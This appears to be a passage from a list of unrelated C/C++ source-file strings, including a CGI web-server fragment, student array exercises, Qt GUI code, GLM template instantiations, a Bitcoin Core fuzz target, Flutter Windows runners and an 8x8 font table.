'\\n');\n                *end_of_uri = '\\0';  // Odcinanie URI\n\n                // Utworzenie procesu potomnego\n                pid_t pid = fork();\n                if (pid == 0) {\n                    // Proces potomny\n                    // Ustawienie QUERY_STRING w zmiennej \u015brodowiskowej\n\n            // IMPORTANT!\n            // DOES NOT WORK - LOOK AT LINE 123 - IT WORKS THAT WAY\n                    setenv(\"QUERY_STRING\", query_string , 1);  // 12 to d\u0142ugo\u015b\u0107 \"/cgi-bin/\"\n                    close(pipefd[0]); // Zamykamy czytanie w child\n\n                    // Przekierowanie `stdout` na koniec zapisu potoku\n                    dup2(pipefd[1], STDOUT_FILENO);\n                    close(pipefd[1]);\n                    // Uruchomienie skryptu CGI\n                    // const char *args[] = {\"./cgi/mycgi.py\", nullptr};  // \u015acie\u017cka do skryptu\n                    // execvp(args[0], (char *const *)args);\n                    const char *python_path = \"/usr/bin/python3\";\n                    const char *script_path = \"./src/cgi/mycgi.py\";\n                    const char *page = \"index.html\";\n            // PASS REQUESTED PAGE (eg. index.html) AS ARG\n         ",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <Windows.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstatic void create(int* arr, int SIZE, int MIN, int MAX, int i)\r\n{\r\n    if (i < SIZE)\r\n    {\r\n        arr[i] = MIN + rand() % (MAX - MIN + 1);\r\n        create(arr, SIZE, MIN, MAX, i + 1);\r\n    }\r\n}\r\n\r\n\r\nstatic void Print(int* arr, const int SIZE, int i)\r\n{\r\n    cout << setw(4) << arr[i];\r\n    if (i < SIZE - 1)\r\n        Print(arr, SIZE, i + 1);\r\n    else\r\n        cout << endl;\r\n}\r\n\r\n\r\nstatic void FindMinMaxIndexes(int* arr, int SIZE, int i, int& minIndex, int& maxIndex)\r\n{\r\n    if (i < SIZE)\r\n    {\r\n        if (arr[i] < arr[minIndex])\r\n            minIndex = i;\r\n        if (arr[i] > arr[maxIndex])\r\n            maxIndex = i;\r\n        FindMinMaxIndexes(arr, SIZE, i + 1, minIndex, maxIndex);\r\n    }\r\n}\r\n\r\n\r\nstatic double FindAverageOfMinMaxIndexes(int* arr, int SIZE)\r\n{\r\n    int minIndex = 0, maxIndex = 0;\r\n    FindMinMaxIndexes(arr, SIZE, 1, minIndex, maxIndex); \r\n\r\n    return (minIndex + maxIndex) / 2.0;\r\n}\r\n\r\nint main()\r\n{\r\n    srand((unsigned)time(NULL));\r\n\r\n    SetConsoleCP(1251);\r\n    SetConsoleOutputCP(1251);\r\n\r\n    const int SIZE = 10;\r\n    int MIN = -10;\r\n    int MAX = 10;\r\n\r\n    int* arr = new int[SIZE];\r\n    create(arr, SIZE, MIN, MAX, 0);  \r\n\r\n    Print(arr, SIZE, 0); \r\n    cout << \"\\n\\n\";\r\n\r\n    \r\n    cout << \"\u00d1\u00e5\u00f0\u00e5\u00e4\u00ed\u00ba \u00e0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00ed\u00e5 \u00b3\u00ed\u00e4\u00e5\u00ea\u00f1\u00b3\u00e2 \u00ec\u00b3\u00ed\u00b3\u00ec\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00b3 \u00ec\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2: \"\r\n        << FindAverageOfMinMaxIndexes(arr, SIZE) << endl;\r\n\r\n    delete[] arr;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"ApartmentPanel.h\"\n\nApartmentPanel::ApartmentPanel(int num) : QWidget(), apartNum(num) {\n    setWindowTitle(QStringLiteral(\"Apartment \u2116 %1\").arg(apartNum));\n    QLabel* label = new QLabel(QStringLiteral(\"Apartment \u2116 %1 Panel\").arg(apartNum));\n    label->setAlignment(Qt::AlignCenter);\n\n    horizontalLayout = new QHBoxLayout();\n    mainLayout = new QVBoxLayout();\n\n    openButton = new QPushButton(\"Open\");\n    openButton->setEnabled(false);\n    closeButton = new QPushButton(\"Block\");\n    closeButton->setEnabled(false);\n    connectButton = new QPushButton(\"Connect\");\n//    setStyleSheet(\"QPushButton {\"\n//                  \"    background-color: #3498db;\"\n//                  \"    border: none;\"\n//                  \"    color: white;\"\n//                  \"    padding: 5px 5px;\"\n//                  \"    text-align: center;\"\n//                  \"    text-decoration: none;\"\n//                  \"    display: inline-block;\"\n//                  \"    font-size: 15px;\"\n//                  \"    margin: 4px 2px;\"\n//                  \"    cursor: pointer;\"\n//                  \"    border-radius: 8px;\"\n//                  \"}\");\n//    openButton -> setFixedSize(135,45);\n//    closeButton -> setFixedSize(135,45);\n//    connectButton -> setFixedSize(135,45);\n\n    connect(openButton, &QPushButton::clicked, this, &ApartmentPanel::doorButtonClick);\n    connect(connectButton, &QPushButton::clicked, this, &ApartmentPanel::connectButtonClick);\n    connect(closeButton, &QPushButton::clicked, this, &ApartmentPanel::closeButtonClick);\n\n    horizontalLayout->addWidget(connectButton);\n    horizontalLayout->addWidget(openButton);\n    horizontalLayout->addWidget(closeButton);\n\n    mainLayout->addWidget(label);\n    mainLayout->addLayout(horizontalLayout);\n\n    setLayout(mainLayout);\n}\n\nvoid ApartmentPanel::doorButtonClick() {\n    emit doorOpen(apartNum);\n    close();\n}\n\nvoid ApartmentPanel::connectButtonClick() {\n    emit connectOpen(apartNum);\n    connectButton->setEnabled(false);\n    openButton->setEnabled(true);\n    closeButton->setEnabled(true);\n}\n\nvoid ApartmentPanel::closeButtonClick() {\n    emit connectBlock(apartNum);\n    close();\n}\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"mainwindow.h\"\n#include <QtWidgets>\n#include <QSettings>\n#include \"myscribbler.h\"\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n{\n    // Setup the UI\n    QWidget *center = new QWidget(this);\n    QHBoxLayout *splitter = new QHBoxLayout(center);\n\n    scribbler = new myScribbler();\n    tabs = new QTabWidget();\n\n    splitter->addWidget(scribbler);\n    splitter->addWidget(tabs);\n\n    setCentralWidget(center);\n    resize(800, 600);\n\n    // Setting up last directory\n    QSettings settings(\"jsandoval\", \"Scribbler\");\n    lastDir = settings.value(\"lastDir\", \"\").toString();\n\n    // FILE MENU\n    // Save action\n    saveAction = new QAction(\"Save Drawing\", this);\n    saveAction->setShortcut(QKeySequence::Save);\n    connect(saveAction, &QAction::triggered, this, &MainWindow::saveFile);\n\n    // Load action\n    loadAction = new QAction(\"Load Drawing\", this);\n    loadAction->setShortcut(QKeySequence::Open);\n    connect(loadAction, &QAction::triggered, this, &MainWindow::openFile);\n\n    // Reset action\n    resetAction = new QAction(\"Reset Drawing\", this);\n    resetAction->setShortcut(QKeySequence::Undo);\n    connect(resetAction, &QAction::triggered, this, &MainWindow::resetAll);\n\n    QMenu *fileMenu = new QMenu(\"&File\", this);\n    fileMenu->addAction(saveAction);\n    fileMenu->addAction(loadAction);\n    fileMenu->addAction(resetAction);\n\n    // CAPTURE MENU\n    // Start action\n    startAction = new QAction(\"Begin Recording\", this);\n    startAction->setShortcut(QKeySequence(\"Ctrl+B\"));\n    connect(startAction, &QAction::triggered, scribbler, &myScribbler::startCapture);\n\n    // End action\n    endAction = new QAction(\"End Recording\", this);\n    endAction->setShortcut(QKeySequence(\"Ctrl+E\"));\n    connect(endAction, &QAction::triggered, scribbler, &myScribbler::endCapture);\n\n    QMenu *captureMenu = new QMenu(\"&Capture\", this);\n    captureMenu->addAction(startAction);\n    captureMenu->addAction(endAction);\n\n    // VIEW MENU\n    // Line action\n    lineAction = new QAction(\"Line Segments\", this);\n    lineAction->setShortcut(QKeySequence(\"Ctrl+L\"));\n    connect(lineAction, &QAction::triggered, scribbler, &myScribbler::lineSegments);\n\n    // Dots action\n    dotsAction = new QAction(\"Only Dots\", this);\n    dotsAction->setShortcut(QKeySequence(\"Ctrl+D\"));\n    connect(dotsAction, &QAction::triggered, scribbler, &myScribbler::dotsOnly);\n\n    QMenu *viewMenu = new QMenu(\"&View\", this);\n    viewMenu->addAction(lineAction);\n    viewMenu->addAction(dotsAction);\n\n    // Other connections\n    connect(scribbler, &myScribbler::emitMySignal, this, &MainWindow::makeTable);\n    connect(tabs, &QTabWidget::currentChanged, this, &MainWindow::fadeOtherTabs);\n\n    menuBar()->addMenu(fileMenu);\n    menuBar()->addMenu(captureMenu);\n    menuBar()->addMenu(viewMenu);\n\n    pageCount = 0;\n    tabs->hide();\n}\n\nMainWindow::~MainWindow() {\n    // Save last directory to settings\n    QSettings settings(\"jsandoval\", \"Scribbler\");\n    settings.setValue(\"lastDir\", lastDir);\n}\n\nvoid MainWindow::makeTable(QList<MouseEvent> ev, bool appendToAllEvents) {\n    if (ev.isEmpty())\n        return;\n\n    QTableWidget *eventsTable = new QTableWidget();\n    eventsTable->setRowCount(ev.size());\n    eventsTable->setColumnCount(4);\n\n    QStringList headers;\n    headers << \"Action\" << \"Position\" << \"Time (s)\" << \"Distance (px)\";\n    eventsTable->setHorizontalHeaderLabels(headers);\n\n    quint64 firstEventTime = ev.first().time;\n\n    for (int i = 0; i < ev.size(); ++i) {\n        const MouseEvent &e = ev[i];\n\n        // Action\n        QString actionStr;\n        switch (e.action) {\n        case MouseEvent::Press:\n            actionStr = \"Press\";\n            break;\n        case MouseEvent::Move:\n            actionStr = \"Move\";\n            break;\n        case MouseEvent::Release:\n            actionStr = \"Release\";\n            break;\n        default:\n            actionStr = \"?\";\n            break;\n        }\n        eventsTable->setItem(i, 0, new QTableWidgetItem(actionStr));\n\n        // Position\n        QString posStr = QString(\"(%1, %2)\").arg(e.pos.x()).arg(e.pos.y());\n        eventsTable->setItem(i, 1, new QTableWidgetItem(posStr));\n\n        // Time\n        double timeInSeconds = (e.time - firstEventTime) / 1000.0;\n        QString timeStr = QString::number(timeInSeconds, 'f', 3);\n        eventsTable->setItem(i, 2, new QTableWidgetItem(timeStr));\n\n        // Distance\n        QString distanceStr = QString::number(e.distance, 'f', 2);\n        eventsTable->setItem(i, 3, new QTableWidgetItem(distanceStr));\n    }\n\n    connect(eventsTable, &QTableWidget::itemSelectionChanged, this, &MainWindow::tableRowSelected);\n\n    QString tabName = QString(\"Capture %1\").arg(pageCount++);\n    tabs->addTab(eventsTable, tabName);\n    tabs->show();\n\n    if (appendToAllEvents) {\n        allEvents.append(ev);\n    }\n\n    fadeOtherTabs(tabs->currentIndex());\n}\n\nvoid MainWindow::resetAll() {\n    scribbler->resetDrawing();\n    tabs->clear();\n    tabs->hide();\n    pageCount = 0;\n    allEve",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main() {\r\n\r\n    cout << \"Nama  : Diego Andreas Simanjuntak\" << endl;\r\n    cout << \"Kelas : 1B Informatika\" << endl;\r\n    cout << \"NPM   : 2410631170068\" << endl;\r\n    cout << \"\\nTugas Pertemuan 7\" << endl;\r\n\r\n    const int ukuran = 10;\r\n    int arr[ukuran];\r\n    int nilaiTertinggi = INT_MIN;\r\n\r\n\r\n    cout << \"\\n\\nMasukkan \" << ukuran << \" angka\" << endl;\r\n    for (int i = 0; i < ukuran; i++) {\r\n        cout << \"Angka ke-\" << (i + 1) << \": \";\r\n        cin >> arr[i];\r\n\r\n        // Memeriksa dan memperbarui nilai tertinggi\r\n        if (arr[i] > nilaiTertinggi) {\r\n            nilaiTertinggi = arr[i];\r\n        }\r\n    }\r\n\r\n    // Menampilkan nilai tertinggi\r\n    cout << \"Nilai tertinggi dalam array adalah: \" << nilaiTertinggi << endl;\r\n\r\n    // Mencari angka yang diinputkan user\r\n    int mencariAngka;\r\n    cout << \"Masukkan angka yang ingin dicari: \";\r\n    cin >> mencariAngka;\r\n\r\n    bool ditemukan = false;\r\n    for (int i = 0; i < ukuran; i++) {\r\n        if (arr[i] == mencariAngka) {\r\n            cout << \"Angka \" << mencariAngka << \" ditemukan pada indeks: \" << i << endl;\r\n            ditemukan = true;\r\n        }\r\n    }\r\n\r\n    if (!ditemukan) {\r\n        cout << \"Angka \" << mencariAngka << \" tidak ditemukan dalam array.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// Copyright (c) 2020-2021 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <chainparams.h>\n#include <clientversion.h>\n#include <flatfile.h>\n#include <test/fuzz/FuzzedDataProvider.h>\n#include <test/fuzz/fuzz.h>\n#include <test/fuzz/util.h>\n#include <test/util/setup_common.h>\n#include <validation.h>\n\n#include <cstdint>\n#include <vector>\n\nnamespace {\nconst TestingSetup* g_setup;\n} // namespace\n\nvoid initialize_load_external_block_file()\n{\n    static const auto testing_setup = MakeNoLogFileContext<const TestingSetup>();\n    g_setup = testing_setup.get();\n}\n\nFUZZ_TARGET(load_external_block_file, .init = initialize_load_external_block_file)\n{\n    FuzzedDataProvider fuzzed_data_provider{buffer.data(), buffer.size()};\n    FuzzedFileProvider fuzzed_file_provider{fuzzed_data_provider};\n    AutoFile fuzzed_block_file{fuzzed_file_provider.open()};\n    if (fuzzed_block_file.IsNull()) {\n        return;\n    }\n    if (fuzzed_data_provider.ConsumeBool()) {\n        // Corresponds to the -reindex case (track orphan blocks across files).\n        FlatFilePos flat_file_pos;\n        std::multimap<uint256, FlatFilePos> blocks_with_unknown_parent;\n        g_setup->m_node.chainman->LoadExternalBlockFile(fuzzed_block_file, &flat_file_pos, &blocks_with_unknown_parent);\n    } else {\n        // Corresponds to the -loadblock= case (orphan blocks aren't tracked across files).\n        g_setup->m_node.chainman->LoadExternalBlockFile(fuzzed_block_file);\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"arplugin\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"open_street_map_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"font8x8.h\"\n\nPROGMEM const unsigned char font8x8[] = {\n8,8,0,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n0x00, 0x3E, 0x41, 0x55, 0x41, 0x55, 0x49, 0x3E, \n0x00, 0x3E, 0x7F, 0x6B, 0x7F, 0x6B, 0x77, 0x3E, \n0x00, 0x22, 0x77, 0x7F, 0x7F, 0x3E, 0x1C, 0x08, \n0x00, 0x08, 0x1C, 0x3E, 0x7F, 0x3E, 0x1C, 0x08, \n0x00, 0x08, 0x1C, 0x2A, 0x7F, 0x2A, 0x08, 0x1C, \n0x00, 0x08, 0x1C, 0x3E, 0x7F, 0x3E, 0x08, 0x1C, \n0x00, 0x00, 0x1C, 0x3E, 0x3E, 0x3E, 0x1C, 0x00, \n0xFF, 0xFF, 0xE3, 0xC1, 0xC1, 0xC1, 0xE3, 0xFF, \n0x00, 0x00, 0x1C, 0x22, 0x22, 0x22, 0x1C, 0x00, \n0xFF, 0xFF, 0xE3, 0xDD, 0xDD, 0xDD, 0xE3, 0xFF, \n0x00, 0x0F, 0x03, 0x05, 0x39, 0x48, 0x48, 0x30, \n0x00, 0x08, 0x3E, 0x08, 0x1C, 0x22, 0x22, 0x1C, \n0x00, 0x18, 0x14, 0x10, 0x10, 0x30, 0x70, 0x60, \n0x00, 0x0F, 0x19, 0x11, 0x13, 0x37, 0x76, 0x60, \n0x00, 0x08, 0x2A, 0x1C, 0x77, 0x1C, 0x2A, 0x08, \n0x00, 0x60, 0x78, 0x7E, 0x7F, 0x7E, 0x78, 0x60, \n0x00, 0x03, 0x0F, 0x3F, 0x7F, 0x3F, 0x0F, 0x03, \n0x00, 0x08, 0x1C, 0x2A, 0x08, 0x2A, 0x1C, 0x08, \n0x00, 0x66, 0x66, 0x66, 0x66, 0x00, 0x66, 0x66, \n0x00, 0x3F, 0x65, 0x65, 0x3D, 0x05, 0x05, 0x05, \n0x00, 0x0C, 0x32, 0x48, 0x24, 0x12, 0x4C, 0x30, \n0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x7F, 0x7F, \n0x00, 0x08, 0x1C, 0x2A, 0x08, 0x2A, 0x1C, 0x3E, \n0x00, 0x08, 0x1C, 0x3E, 0x7F, 0x1C, 0x1C, 0x1C, \n0x00, 0x1C, 0x1C, 0x1C, 0x7F, 0x3E, 0x1C, 0x08, \n0x00, 0x08, 0x0C, 0x7E, 0x7F, 0x7E, 0x0C, 0x08, \n0x00, 0x08, 0x18, 0x3F, 0x7F, 0x3F, 0x18, 0x08, \n0x00, 0x00, 0x00, 0x70, 0x70, 0x70, 0x7F, 0x7F, \n0x00, 0x00, 0x14, 0x22, 0x7F, 0x22, 0x14, 0x00, \n0x00, 0x08, 0x1C, 0x1C, 0x3E, 0x3E, 0x7F, 0x7F, \n0x00, 0x7F, 0x7F, 0x3E, 0x3E, 0x1C, 0x1C, 0x08, \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n0x00, 0x18, 0x3C, 0x3C, 0x18, 0x18, 0x00, 0x18, \n0x00, 0x36, 0x36, 0x14, 0x00, 0x00, 0x00, 0x00, \n0x00, 0x36, 0x36, 0x7F, 0x36, 0x7F, 0x36, 0x36, \n0x00, 0x08, 0x1E, 0x20, 0x1C, 0x02, 0x3C, 0x08, \n0x00, 0x60, 0x66, 0x0C, 0x18, 0x30, 0x66, 0x06, \n0x00, 0x3C, 0x66, 0x3C, 0x28, 0x65, 0x66, 0x3F, \n0x00, 0x18, 0x18, 0x18, 0x30, 0x00, 0x00, 0x00, \n0x00, 0x60, 0x30, 0x18, 0x18, 0x18, 0x30, 0x60, \n0x00, 0x06, 0x0C, 0x18, 0x18, 0x18, 0x0C, 0x06, \n0x00, 0x00, 0x36, 0x1C, 0x7F, 0x1C, 0x36, 0x00, \n0x00, 0x00, 0x08, 0x08, 0x3E, 0x08, 0x08, 0x00, \n0x00, 0x00, 0x00, 0x00, 0x30, 0x30, 0x30, 0x60, \n0x00, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x60, \n0x00, 0x00, 0x06, 0x0C, 0x18, 0x30, 0x60, 0x00, \n0x00, 0x3C, 0x66, 0x6E, 0x76, 0x66, 0x66, 0x3C, \n0x00, 0x18, 0x18, 0x38, 0x18, 0x18, 0x18, 0x7E, \n0x00, 0x3C, 0x66, 0x06, 0x0C, 0x30, 0x60, 0x7E, \n0x00, 0x3C, 0x66, 0x06, 0x1C, 0x06, 0x66, 0x3C, \n0x00, 0x0C, 0x1C, 0x2C, 0x4C, 0x7E, 0x0C, 0x0C, \n0x00, 0x7E, 0x60, 0x7C, 0x06, 0x06, 0x66, 0x3C, \n0x00, 0x3C, 0x66, 0x60, 0x7C, 0x66, 0x66, 0x3C, \n0x00, 0x7E, 0x66, 0x0C, 0x0C, 0x18, 0x18, 0x18, \n0x00, 0x3C, 0x66, 0x66, 0x3C, 0x66, 0x66, 0x3C, \n0x00, 0x3C, 0x66, 0x66, 0x3E, 0x06, 0x66, 0x3C, \n0x00, 0x00, 0x18, 0x18, 0x00, 0x18, 0x18, 0x00, \n0x00, 0x00, 0x18, 0x18, 0x00, 0x18, 0x18, 0x30, \n0x00, 0x06, 0x0C, 0x18, 0x30, 0x18, 0x0C, 0x06, \n0x00, 0x00, 0x00, 0x3C, 0x00, 0x3C, 0x00, 0x00, \n0x00, 0x60, 0x30, 0x18, 0x0C, 0x18, 0x30, 0x60, \n0x00, 0x3C, 0x66, 0x06, 0x1C, 0x18, 0x00, 0x18, \n0x00, 0x38, 0x44, 0x5C, 0x58, 0x42, 0x3C, 0x00, \n0x00, 0x3C, 0x66, 0x66, 0x7E, 0x66, 0x66, 0x66, \n0x00, 0x7C, 0x66, 0x66, 0x7C, 0x66, 0x66, 0x7C, \n0x00, 0x3C, 0x66, 0x60, 0x60, 0x60, 0x66, 0x3C, \n0x00, 0x7C, 0x66, 0x66, 0x66, 0x66, 0x66, 0x7C, \n0x00, 0x7E, 0x60, 0x60, 0x7C, 0x60, 0x60, 0x7E, \n0x00, 0x7E, 0x60, 0x60, 0x7C, 0x60, 0x60, 0x60, \n0x00, 0x3C, 0x66, 0x60, 0x60, 0x6E, 0x66, 0x3C, \n0x00, 0x66, 0x66, 0x66, 0x7E, 0x66, 0x66, 0x66, \n0x00, 0x3C, 0x18, 0x18, 0x18, 0x18, 0x18, 0x3C, \n0x00, 0x1E, 0x0C, 0x0C, 0x0C, 0x6C, 0x6C, 0x38, \n0x00, 0x66, 0x6C, 0x78, 0x70, 0x78, 0x6C, 0x66, \n0x00, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x7E, \n0x00, 0x63, 0x77, 0x7F, 0x6B, 0x63, 0x63, 0x63, \n0x00, 0x63, 0x73, 0x7B, 0x6F, 0x67, 0x63, 0x63, \n0x00, 0x3C, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3C, \n0x00, 0x7C, 0x66, 0x66, 0x66, 0x7C, 0x60, 0x60, \n0x00, 0x3C, 0x66, 0x66, 0x66, 0x6E, 0x3C, 0x06, \n0x00, 0x7C, 0x66, 0x66, 0x7C, 0x78, 0x6C, 0x66, \n0x00, 0x3C, 0x66, 0x60, 0x3C, 0x06, 0x66, 0x3C, \n0x00, 0x7E, 0x5A, 0x18, 0x18, 0x18, 0x18, 0x18, \n0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3E, \n0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3C, 0x18, \n0x00, 0x63, 0x63, 0x63, 0x6B, 0x7F, 0x77, 0x63, \n0x00, 0x63, 0x63, 0x36, 0x1C, 0x36, 0x63, 0x63, \n0x00, 0x66, 0x66, 0x66, 0x3C, 0x18, 0x18, 0x18, \n0x00, 0x7E, 0x06, 0x0C, 0x18, 0x30, 0x60, 0x7E, \n0x00, 0x1E, 0x18, 0x18, 0x18, 0x18, 0x18, 0x1E, \n0x00, 